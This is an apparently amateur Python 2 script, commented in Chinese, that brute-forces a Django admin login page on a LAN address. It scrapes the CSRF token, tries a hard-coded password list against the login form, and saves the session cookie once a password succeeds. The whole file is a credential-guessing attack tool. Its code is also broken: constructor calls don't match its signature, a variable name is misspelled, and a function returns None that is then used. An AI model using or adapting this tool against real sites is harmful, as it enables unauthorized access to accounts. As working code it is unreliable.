#!/usr/bin/python
#coding=utf8
#filename:web_auth_cookie_django.py
"""
需要增加1：从文本文件中读取密码，并用一个文件来保存当前读取到的位置，
下一次可以判断有无记录位置的文件，作为进度保存。
20130716-1500 http://192.168.1.214:8000/admin/
"""
import urllib
import urllib2
import cookielib
import time

class Auth_Cookie():
    def __init__(self, user_agent, cookie_file):
        self.client_headers = {'User-Agent':user_agent}
        self.cookiejar = cookielib.MozillaCookieJar(cookie_file)
        self.cookieproc = urllib2.HTTPCookieProcessor(self.cookiejar)
        self.opener = urllib2.build_opener(self.cookieproc)

    def pre_read(self, url):
        #根据pre_read普通访问后生成的csrfmiddlewaretoken信息来生成将要提交的FORM中的对应信息
        try:
            response = urllib2.urlopen(url)
        except urllib2.HTTPError, e:
            print "at urllib2.urlopen, raise ERROR (", e, ") "
            return
        self.response = response.read()
        tmp = self.response.find("csrfmiddlewaretoken")
        tmp2 = self.response[tmp:tmp+60]
        self.csrfM = tmp2.split("'")[2]
        return

    def make_cookie(self, pre_resp):
        #重新生成cookie
        self.cookiejar.clear()
        self.cookiejar.make_cookies(pre_resp, self.req)
        print pre_resp
        self.cookieproc = urllib2.HTTPCookieProcessor(self.cookiejar)
        self.opener = urllib2.build_opener(self.cookieproc)
        return

    def crack(self, pwd_list, url, username, csrfM):
        for key1 in pwd_list:
            pwd_encode = urllib.urlencode({
                    'username': username,
                    'password': key1,
                    'this_is_the_login_form': 1,
                    'next': '/admin/',
                    'csrfmiddlewaretoken': csrfM,
                    })
            try:
                self.req = urllib2.Request(url, self.client_headers)
                response = self.opener.open(self.req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR (", e, ") "
                return
            response_resu = response.getcode()
            if response_resu == 200:
                response_html = response.read()
                #怎么样判断是通过验证，标志是***用户登陆失败***
                case = respon_html.find('Please enter the correct')
                if case != -1:
                    #print "false.....", key1
                    pass
                else:
                    print time.ctime(), " Find The Key: ", key1
                    self.cookiejar.save()
                    return "good luck"
        return "error"

    def test():
        global aaa1
        s11 = Auth_Cookie(agent11, file11, url11, 'scbh001')
        aaa1 = s11.crack(pwd11)

#ready to crack:
url11 = "http://192.168.192.214:8000/admin/"
file11 = "/tmp/cookie11.txt"
agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
pwd11 = ['aaa', 'bbb', 'ksksie','ssdssw','scbh001', 'admin']
aaa1 = ""

if __name__ == "__main__":
    s11 = Auth_Cookie(agent11, file11, url11, 'admin')
    pre_response = s11.pre_read(url11)
    s11.make_cookie(pre_response)
    pre_cookie_list = pre_response.headers.get('Set-Cookie').split(';')
    csrfT = pre_cookie_list[0].split('=')[1]
    sessionI = pre_cookie_list[3].split('=')[2]
    csrfM = pre_response.read()[896:].split()[6].split('\'')[1]
    print "csrftoken:", csrfT
    print "sessionid:", sessionI
    print "csrfmiddleware:", csrfM
    s11.crack(pwd11, sessionI, csrfM)
